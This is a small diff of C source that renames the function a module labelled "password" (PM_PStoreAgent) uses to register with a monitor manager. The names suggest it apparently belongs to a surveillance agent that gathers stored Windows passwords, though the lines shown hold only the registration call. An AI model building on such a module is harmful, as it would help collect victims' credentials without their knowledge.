@@ -160,5 +160,5 @@ DWORD __stdcall PM_PStoreAgentUnregister()
 
 void PM_PStoreAgentRegister()
 {
-	AM_MonitorRegisterBSON(L"password", PM_PSTOREAGENT, NULL, (BYTE *)PM_PStoreAgentStartStop, (BYTE *)PM_PStoreAgentInit, (BYTE *)PM_PStoreAgentUnregister);
+	AM_MonitorRegister(L"password", PM_PSTOREAGENT, NULL, (BYTE *)PM_PStoreAgentStartStop, (BYTE *)PM_PStoreAgentInit, (BYTE *)PM_PStoreAgentUnregister);
 }
